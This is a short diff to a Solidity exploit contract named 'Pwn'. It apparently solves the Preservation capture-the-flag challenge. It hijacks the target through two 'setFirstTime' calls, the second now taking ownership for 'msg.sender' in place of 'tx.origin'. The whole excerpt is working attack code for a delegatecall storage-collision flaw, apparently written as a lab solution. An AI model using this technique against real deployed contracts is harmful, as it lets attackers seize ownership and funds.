@@ -7,7 +7,7 @@ contract Pwn {
 
     function pwn(Preservation target) external {
         target.setFirstTime(uint256(uint160(address(this))));
-        target.setFirstTime(uint256(uint160(tx.origin)));
+        target.setFirstTime(uint256(uint160(msg.sender)));
     }
 
     function setTime(uint256 _target) public {
